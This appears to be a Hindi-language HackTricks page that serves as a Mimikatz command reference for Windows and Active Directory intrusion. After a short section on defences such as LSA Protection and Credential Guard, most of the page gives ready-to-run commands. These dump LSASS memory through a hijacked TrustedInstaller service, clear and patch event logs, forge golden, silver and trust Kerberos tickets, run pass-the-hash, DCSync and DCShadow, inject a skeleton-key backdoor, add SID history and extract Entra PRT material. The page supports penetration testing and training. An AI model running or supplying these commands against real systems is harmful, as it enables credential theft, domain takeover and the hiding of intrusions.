# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**यह पेज [adsecurity.org](https://adsecurity.org/?page_id=1821) के एक पेज पर आधारित है**। अधिक जानकारी के लिए मूल पेज देखें!<sup>[[3]](#references)</sup>

## LM और मेमोरी में Clear-Text

Windows 8.1 और Windows Server 2012 R2 के बाद से, credentials की चोरी से सुरक्षा के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM hashes और plain-text passwords** अब सुरक्षा बढ़ाने के लिए मेमोरी में संग्रहीत नहीं किए जाते। Digest Authentication को बंद करने के लिए एक विशिष्ट registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, को `0` के DWORD मान पर कॉन्फ़िगर करना आवश्यक है। इससे यह सुनिश्चित होता है कि LSASS में "clear-text" passwords cache न हों।

- **LSA Protection** को Local Security Authority (LSA) process को अनधिकृत memory reading और code injection से बचाने के लिए प्रस्तुत किया गया है। इसके लिए LSASS को protected process के रूप में चिह्नित किया जाता है। LSA Protection को सक्रिय करने के लिए:
  1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ में registry बदलकर `RunAsPPL` को `dword:00000001` पर सेट करें।
  2. ऐसा Group Policy Object (GPO) लागू करें जो प्रबंधित devices पर इस registry बदलाव को लागू करे।

इन सुरक्षा उपायों के बावजूद, Mimikatz जैसे tools विशिष्ट drivers का उपयोग करके LSA Protection को bypass कर सकते हैं, हालांकि ऐसी गतिविधियां event logs में दर्ज होने की संभावना है।

आधुनिक workstations पर यह और भी महत्वपूर्ण है, क्योंकि **Windows 11 22H2+ और Windows Server 2025 के domain-joined, non-DC systems पर Credential Guard अक्सर default रूप से enabled होता है**, जबकि **नए Windows 11 22H2+ installs पर LSASS-as-PPL default रूप से enabled होता है**। व्यवहार में, इसका अर्थ है कि `sekurlsa::logonpasswords` से अक्सर पुराने tradecraft की अपेक्षा कम सामग्री मिलती है और operators तेजी से **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, या **CloudAP/PRT-oriented modules** की ओर बढ़ते हैं। सुरक्षा उपायों के बारे में जानने के लिए [Windows credentials protections](credentials-protections.md) देखें।

### SeDebugPrivilege हटाए जाने का प्रतिकार

Administrators के पास आम तौर पर SeDebugPrivilege होता है, जिससे वे programs को debug कर सकते हैं। अनधिकृत memory dumps रोकने के लिए इस privilege को सीमित किया जा सकता है। Attackers अक्सर मेमोरी से credentials निकालने के लिए इस तकनीक का उपयोग करते हैं। हालांकि, यह privilege हटाए जाने के बाद भी, TrustedInstaller account customized service configuration का उपयोग करके memory dumps ले सकता है:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

इससे `lsass.exe` की memory को file में dump किया जा सकता है, जिसका credentials निकालने के लिए किसी दूसरे system पर analysis किया जा सकता है:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz विकल्प

Mimikatz में Event log tampering में दो मुख्य कार्रवाइयाँ शामिल हैं: event logs साफ़ करना और नए events की logging रोकने के लिए Event service को patch करना। इन कार्रवाइयों के लिए commands नीचे दी गई हैं:

#### Event Logs साफ़ करना

Mimikatz में `event::clear` उपलब्ध है। यह चुने गए classic log के लिए Windows event-log clearing API को call करता है। Default `Security` है; `/log:` किसी दूसरे log को चुनता है, और इसे साफ़ करने के लिए caller के पास आवश्यक अधिकार होने चाहिए। यह `event::drop` जैसा नहीं है, जो नए records लिखे जाने से रोकने की कोशिश करता है।<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Experimental Feature: Event Service को पैच करना

- **Command**: `event::drop`
- यह experimental command, Event Logging Service के व्यवहार को संशोधित करने के लिए बनाया गया है, जिससे वह नए events रिकॉर्ड करना प्रभावी रूप से बंद कर देता है।
- उदाहरण: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command यह सुनिश्चित करता है कि Mimikatz के पास system services को संशोधित करने के लिए आवश्यक privileges हों।
- इसके बाद `event::drop` command Event Logging service को पैच करता है।

### Kerberos Ticket Attacks

नीचे दिए गए commands को syntax के त्वरित संदर्भ के रूप में इस्तेमाल करें। [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), और [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) के लिए समर्पित pages में अद्यतन AES/PAC/opsec संबंधी बारीकियाँ दी गई हैं।

### Golden Ticket बनाना

Golden Ticket, पूरे domain में access impersonation की सुविधा देता है। मुख्य command और parameters:

- Command: `kerberos::golden`
- Parameters:
  - `/domain`: Domain का नाम।
  - `/sid`: Domain का Security Identifier (SID)।
  - `/user`: Impersonate करने के लिए username।
  - `/krbtgt`: Domain के KDC service account का NTLM hash।
  - `/ptt`: Ticket को सीधे memory में inject करता है।
  - `/ticket`: Ticket को बाद में इस्तेमाल करने के लिए सहेजता है।

उदाहरण:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Tickets विशिष्ट services तक access देते हैं। मुख्य command और parameters:

- Command: Golden Ticket के समान, लेकिन विशिष्ट services को target करता है।
- Parameters:
  - `/service`: Target करने वाली service (जैसे, cifs, http)।
  - अन्य parameters Golden Ticket के समान।

Example:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Creation

Trust Ticket का उपयोग trust relationships का लाभ उठाकर domains के बीच resources तक पहुँचने के लिए किया जाता है। मुख्य command और parameters:

- Command: Golden Ticket के समान, लेकिन trust relationships के लिए।
- Parameters:
  - `/target`: Target domain का FQDN।
  - `/rc4`: Trust account का NTLM hash।

उदाहरण:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### अतिरिक्त Kerberos कमांड

- **Tickets की सूची बनाना**:

  - कमांड: `kerberos::list`
  - मौजूदा user session के सभी Kerberos tickets की सूची दिखाता है।

- **Pass the Cache**: `kerberos::ptc` MIT/Heimdal `.ccache` file पढ़ता है, `.kirbi` file नहीं। File path को positional argument के रूप में दें: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`।<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` `.kirbi` file या ऐसी files वाली directory पढ़ता है। इसमें भी `/ticket:` के बजाय positional path दिया जाता है: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`। व्यापक workflow के लिए [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) देखें।<sup>[[6]](#references)</sup>

- **Tickets हटाना**:
  - कमांड: `kerberos::purge`
  - Session से सभी Kerberos tickets हटाता है।
  - Conflicts से बचने के लिए ticket manipulation कमांड इस्तेमाल करने से पहले उपयोगी है।

### Over-Pass-the-Hash / Pass-the-Key

अगर `RC4` disabled है या भरोसेमंद नहीं है, तो Mimikatz केवल NT hash का उपयोग करने के बजाय **AES128/AES256 Kerberos keys** को मौजूदा logon session में patch कर सकता है। आधुनिक domains के लिए यह आमतौर पर `sekurlsa::pth` को केवल NTLM तक सीमित मानने से बेहतर है।<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` नया console शुरू करने के बजाय मौजूदा process का फिर से उपयोग करता है। यह तब उपयोगी है जब आप उसी context में तुरंत `lsadump::dcsync` जैसे commands चलाना चाहते हैं।

### Active Directory में छेड़छाड़

- **DCShadow**: AD object में बदलाव करने के लिए किसी machine को अस्थायी रूप से DC की तरह काम करने दें। [DCShadow](../active-directory-methodology/dcshadow.md) देखें।

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Password data का अनुरोध करने के लिए DC की नकल करें। [DCSync](../active-directory-methodology/dcsync.md) देखें।
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credentials तक पहुँच

- **LSADUMP::LSA**: LSA से credentials निकालें।

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Computer account के password data का उपयोग करके DC का impersonation करें।

  - _मूल संदर्भ में NetSync के लिए कोई विशिष्ट command नहीं दी गई है।_

- **LSADUMP::SAM**: Local SAM database तक पहुँचें।

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Registry में संग्रहित secrets को decrypt करें।

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: किसी user के लिए नया NTLM hash सेट करें।

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Trust authentication की जानकारी प्राप्त करें।
  - `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** या **hybrid-joined** hosts पर, `sekurlsa::cloudap` LSASS से cache किया गया **Primary Refresh Token (PRT)** material दिखा सकता है। इसका `ProofOfPossesionKey.KeyValue` DPAPI-संरक्षित session-key blob है, पहले से decrypt की गई key नहीं।<sup>[[7]](#references)[[8]](#references)</sup> `/unprotect` का उपयोग करने के लिए, `SYSTEM` के रूप में `dpapi::cloudapkd` चलाएँ (उदाहरण के लिए, elevated Mimikatz session से `token::elevate` चलाकर), या पहले `sekurlsa::dpapi` से Mimikatz का key cache भरें। केवल `privilege::debug` चलाने से DPAPI caller context नहीं बदलता।<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

पहले command से **matching** `Context` और `Derived Key` को दूसरे command में कॉपी करें; अगर कोई context नहीं दिया जाता है, तो Mimikatz नया context बनाता है। TPM-protected key के लिए भी, Mimikatz मूल device पर TPM का इस्तेमाल करके signing key derive कर सकता है। Clear key को export करना ज़रूरी नहीं है, लेकिन derived-key का सफल परिणाम browser cookie पर sign कर सकता है।<sup>[[7]](#references)</sup>

अकेली PRT string पर्याप्त नहीं है, क्योंकि Microsoft Entra को उससे जुड़ी session key के possession का proof चाहिए।<sup>[[9]](#references)</sup> अन्य master-key विकल्पों के लिए [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) देखें और cloud-side chain के लिए [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) देखें।

### विविध

- **MISC::Skeleton**: DC पर LSASS में backdoor inject करें।
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Backup rights प्राप्त करें।

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug privileges प्राप्त करें।
  - `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: लॉग-इन किए गए users के credentials दिखाएँ।

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Memory से Kerberos tickets निकालें।
  - `mimikatz "sekurlsa::tickets /export" exit`

### SID और Token में बदलाव

- **SID::add/modify**: SID और SIDHistory बदलें।

  - जोड़ें: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - बदलें: _मूल context में बदलने के लिए कोई विशिष्ट command नहीं है।_

- **TOKEN::Elevate**: Tokens impersonate करें।
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: एक से अधिक RDP sessions की अनुमति दें।

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions की सूची दिखाएँ।
  - _मूल context में TS::Sessions के लिए कोई विशिष्ट command नहीं दिया गया है।_

### Vault

- Windows Vault से passwords निकालें।
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB और Entra ID: अपने नए cache flow से मिलें](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
- [4] [Mimikatz event module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mimikatz ccache module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mimikatz Kerberos module source](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPI implementation](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Primary Refresh Token के बारे में और गहराई से जानें](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra Primary Refresh Token protection](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
